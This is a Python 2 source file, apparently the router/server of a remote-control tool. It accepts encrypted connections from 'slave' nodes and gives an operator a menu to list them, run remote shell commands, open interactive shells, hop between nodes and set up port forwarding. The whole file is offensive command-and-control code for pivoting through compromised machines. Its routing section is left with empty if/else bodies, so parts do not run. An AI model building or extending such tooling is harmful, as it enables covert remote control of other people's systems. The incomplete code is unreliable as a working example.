# -*- coding: utf-8 -*-

import socket
import threading
import random
import time
import hashlib
import string
import struct
import sys
import os

from Crypto.Cipher import AES

from slave import slaver
from slave import port_data_to_int
from slave import int_to_port_data

MAX_CONNECTION_NUMBER = 0x10
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 61424


class Router():
    def __init__(self, socket_fd, password):
        self.socket_fd = socket_fd
        self.hostname, self.port = socket_fd.getpeername()
        self.router_hash = get_node_hash(self.hostname, self.port)
        self.password = password

    def show_info(self):
        print "[+] IP : %s" % (self.hostname)
        print "[+] Port : %s" % (self.port)

    def shell_exec(self, shell_command):
        CMD = "\x00" # Shell Exec CMD
        LENGTH = chr(len(shell_command) % 0x100) # Robust
        data = CMD + LENGTH + shell_command
        # print "[+] Sending data : %s" % (repr(data))
        self.socket_fd.send(data)
        return_code = decrypt(self.socket_fd.recv(1))
        if return_code == "\x00":
            length_data = decrypt(self.socket_fd.recv(2))
            length = (ord(length_data[1]) * 0x100) + ord(length_data[0])
            result = decrypt(self.socket_fd.recv(length))
            return result
        else:
            return None

    def port_forwarding(self, listen_host, listen_port, dst_host, dst_port):
        CMD = "\x01" # Post Forwarding CMD
        data = CMD + listen_host + listen_port + dst_host + dst_port
        print "[+] Sending data : %s" % (repr(data))
        self.socket_fd.send(data)

    def close_connection(self):
        self.socket_fd.shutdown(socket.SHUT_RDWR)
        self.socket_fd.close()

def get_table(key):
    m = hashlib.md5()
    m.update(key)
    s = m.digest()
    (a, b) = struct.unpack('<QQ', s)
    table = [c for c in string.maketrans('', '')]
    for i in xrange(1, 1024):
        table.sort(lambda x, y: int(a % (ord(x) + i) - a % (ord(y) + i)))
    return table

encrypt_table = ""
decrypt_table = ""

def encrypt(data):
    return data.translate(encrypt_table)

def decrypt(data):
    return data.translate(decrypt_table)

def AES_encrypt(plain, key):
    e = AES.new(key, AES.MODE_CBC, '\x00' * 16)
    plain += "\x00" * (16 - len(plain) % 16)
    cipher = e.encrypt(plain)
    return cipher

def AES_decrypt(cipher, key):
    e = AES.new(key, AES.MODE_CBC, '\x00' * 16)
    plain = e.decrypt(cipher)
    return plain.rstrip("\x00")

def md5(data):
    return hashlib.md5(data).hexdigest()

def get_node_hash(host, port):
    return md5("%s:%d" % (host, port))

def random_string(length, charset):
    return "".join([random.choice(charset) for i in range(length)])

CHALLENGE_LENGTH = 0x20

routers = {}
masters = {}

def server(host, port, password):
    print "[+] Server starting at %s:%d" % (host, port)
    server_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_fd.bind((host, port))
    server_fd.listen(MAX_CONNECTION_NUMBER)
    charset = string.letters + string.digits
    hello = "\xE5\xA4\xA9\xE7\x8E\x8B\xE7\x9B\x96\xE5\x9C\xB0\xE8\x99\x8E"
    reply = "\xE5\xAE\x9D\xE5\xA1\x94\xE9\x95\x87\xE6\xB2\xB3\xE5\xA6\x96"
    while(True):
        node_fd, node_addr = server_fd.accept()
        node_host = node_addr[0]
        node_port = node_addr[1]
        print "[+] New connection from %s:%d" % (node_host, node_port)
        node_hello = decrypt(node_fd.recv(len(hello)))
        # check hello data
        if node_hello != hello:
            print "[+] Fake client"
            node_fd.shutdown(socket.SHUT_RDWR)
            node_fd.close()
            continue
        node_fd.send(encrypt(reply))
        time.sleep(0.5)
        # auth challenge
        challenge = random_string(CHALLENGE_LENGTH, charset)
        node_fd.send(encrypt(challenge))
        except_challenge_result = AES_encrypt(challenge, password)
        # print "[+] Excepted challenge result : %r" % (except_challenge_result)
        node_challenge_result = decrypt(node_fd.recv(len(except_challenge_result)))
        # print "[+] Client send challenge result : %r" % (node_challenge_result)
        if node_challenge_result != except_challenge_result:
            print "[-] Real client use a wrong password to auth!"
            node_fd.shutdown(socket.SHUT_RDWR)
            node_fd.close()
            continue
        is_master = (decrypt(node_fd.recv(1)) == "\x00")
        # auth accepted
        node_fd.send(encrypt("\x80")) # Authed
        # Sending correct ip address
        node_fd.send(encrypt(socket.inet_aton(node_host)))
        print "[+] Connected with successful auth!"
        print "[+] Adding node(%s:%d) to online list..." % (node_host, node_port)
        if is_master:
            # masters[get_node_hash(node_host, node_port)] = Node(node_fd)
            print "[+] Master node's connection is not implyed!"
            pass
        else:
            routers[get_node_hash(node_host, node_port)] = Router(node_fd, password)

def attach(host, port, password, is_master):
    hello = "\xE5\xA4\xA9\xE7\x8E\x8B\xE7\x9B\x96\xE5\x9C\xB0\xE8\x99\x8E"
    reply = "\xE5\xAE\x9D\xE5\xA1\x94\xE9\x95\x87\xE6\xB2\xB3\xE5\xA6\x96"
    socket_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_fd.connect((host, port))
    socket_fd.send(encrypt(hello))
    server_reply = decrypt(socket_fd.recv(len(reply)))
    if server_reply != reply:
        print "[-] Fake server!"
        socket_fd.shutdown(socket.SHUT_RDWR)
        socket_fd.close()
        return
    challenge = decrypt(socket_fd.recv(CHALLENGE_LENGTH))
    socket_fd.send(encrypt(AES_encrypt(challenge, password)))
    if is_master:
        socket_fd.send(encrypt("\x00")) # Master's request
    else:
        socket_fd.send(encrypt("\x01")) # Router's request
    auth_result = decrypt(socket_fd.recv(1))
    if auth_result != "\x80":
        print "[-] Password error!"
        return
    print "[+] Connected with successful auth!"
    host = socket.inet_ntoa(decrypt(socket_fd.recv(4)))
    port = DEFAULT_PORT
    print "[+] Starting routing..."
    while True:
        encrypted_CMD = socket_fd.recv(0x1)
        '''
        if not encrypted_data:
            print "[-] Reading data error! Breaking..."
            break
        '''
        CMD = decrypt(encrypted_CMD)
        if CMD == "\x00": # Route
            # open new port to transer package
            TTL = ord(decrypt(socket_fd.recv(1)))
            if TTL == 0:
                print "[-] This package travels too many times!"
                # clear buffer
                socket_fd.recv((4 + 2) * 4)
                socket_fd.recv(ord(socket_fd.recv(1)))
                continue
            print "[+] TTL : %d" % (TTL)
            temp_dst_host = socket.inet_ntoa(decrypt(socket_fd.recv(4)))
            temp_dst_port = port_data_to_int(decrypt(socket_fd.recv(2)))
            print "[+] Template destnation : %s:%d" % (temp_dst_host, temp_dst_port)
            temp_src_host = socket.inet_ntoa(decrypt(socket_fd.recv(4)))
            temp_src_port = port_data_to_int(decrypt(socket_fd.recv(2)))
            print "[+] Template source : %s:%d" % (temp_src_host, temp_src_port)
            end_dst_host = socket.inet_ntoa(decrypt(socket_fd.recv(4)))
            end_dst_port = port_data_to_int(decrypt(socket_fd.recv(2)))
            print "[+] End destnation : %s:%d" % (end_dst_host, end_dst_port)
            end_src_host = socket.inet_ntoa(decrypt(socket_fd.recv(4)))
            end_src_port = port_data_to_int(decrypt(socket_fd.recv(2)))
            print "[+] End source: %s:%d" % (end_src_host, end_src_port)
            content = socket_fd.recv(ord(socket_fd.recv(1))) # one byte means length of packet
            if temp_dst_host == host and temp_dst_port == port: # the packet is for me

            else:
                # route to the target




        elif CMD == "\x01":
            pass
        else:
            print "[-] Unsupported command : %r" % (CMD)
            continue



def show_commands():
    print "Commands : "
    print "        0. [h|help|?|\\n] : show this help"
    print "        0. [l] : list all online slaves"
    print "        1. [p] : print position"
    print "        1. [s] : show router info"
    print "        1. [i] : interactive shell"
    print "        2. [g] : goto a slave"
    print "        3. [c] : interact an shell"
    print "        3. [f] : port forwarding"
    print "        3. [q|quit|exit] : interact an shell"

def main():
    if len(sys.argv) != 2:
        print "Usage : "
        print "\tpython router.py [PASSWORD]"
        exit(1)
    # host = sys.argv[1]
    host = DEFAULT_HOST
    # port = int(sys.argv[2])
    port = DEFAULT_PORT
    password = md5(sys.argv[1])
    global encrypt_table
    global decrypt_table
    encrypt_table = ''.join(get_table(password))
    decrypt_table = string.maketrans(encrypt_table, string.maketrans('', ''))
    router_thread = threading.Thread(target=server, args=(host, port, password,))
    router_thread.start()
    attach_thread = threading.Thread(target=attach, args=(host, port, password, False,))
    attach_thread.start()
    print "[+] Waiting to create connection to router itself..."
    time.sleep(1)
    if len(routers.keys()) == 0:
        print "[-] Connect to itself error!"
        exit(2)
    show_commands()
    position = routers[routers.keys()[0]].router_hash # master himself
    while True:
        command = raw_input("=>") or "h"
        if command == "h" or command == "help" or command == "?" or command == "\n":
            show_commands()
        elif command == "l":
            print "[+] Listing online routers..."
            for key in routers.keys():
                print "[>>>> %s <<<<]" % (key)
                routers[key].show_info()
        elif command == "p":
            print "[+] Now position router hash : %s" % (position)
        elif command == "g":
            input_router_hash = raw_input("[+] Please input target router hash : ") or position
            print "[+] Input router hash : %s" % (repr(input_router_hash))
            if input_router_hash == position:
                print "[+] Position will not change!"
                continue
            found = False
            for key in routers.keys():
                if key.startswith(input_router_hash):
                    old_router = routers[position]
                    new_router = routers[key]
                    print "[+] Changing position from [%s:%d] to [%s:%d]" % (old_router.hostname, old_router.port, new_router.hostname, new_router.port)
                    position = key
                    found = True
                    break
            if not found:
                print "[-] Please check your input router hash!"
                print "[-] Position is not changed!"
        elif command == "s":
            routers[position].show_info()
        elif command == "f":
            listen_host = socket.inet_aton(raw_input("Input listen host (0.0.0.0) : ") or "0.0.0.0")
            listen_port = int_to_port_data(int(raw_input("Input listen port (8080) : ") or "8080"))
            dst_host = socket.inet_aton(raw_input("Input listen host (192.168.1.1) : ") or "192.168.1.1")
            dst_port = int_to_port_data(int(raw_input("Input listen port (22) : ") or "22"))
            router = routers[position]
            router.port_forwarding(listen_host, listen_port, dst_host, dst_port)
        elif command == "i":
            router = routers[position]
            while True:
                shell_command = raw_input("$ ") or ""
                if shell_command == "exit":
                    break
                if shell_command == "":
                    continue
                result = router.shell_exec(shell_command)
                if result:
                    print result
        elif command == "c":
            router = routers[position]
            shell_command = raw_input("$ ") or ""
            if shell_command == "":
                print "[-] Please input your command!"
            else:
                print "[+] Executing : %s" % (repr(shell_command))
                result = router.shell_exec(shell_command)
                if result:
                    print "[+] Executing command success!"
                    print "[%s]" % ("-" * 0x10)
                    print result
                else:
                    print "[-] Executing command failed!"
        elif command == "q" or command == "quit" or command == "exit":
            # TODO : release all resources before closing
            print "[+] Releasing resources..."
            for key in routers.keys():
                router = routers[key]
                print "[+] Closing conntion of %s:%d" % (router.hostname, router.port)
                router.socket_fd.shutdown(socket.SHUT_RDWR)
                router.socket_fd.close()
            print "[+] Exiting..."
            exit(0)
        else:
            print "[-] Please check your input!"

if __name__ == "__main__":
    main()
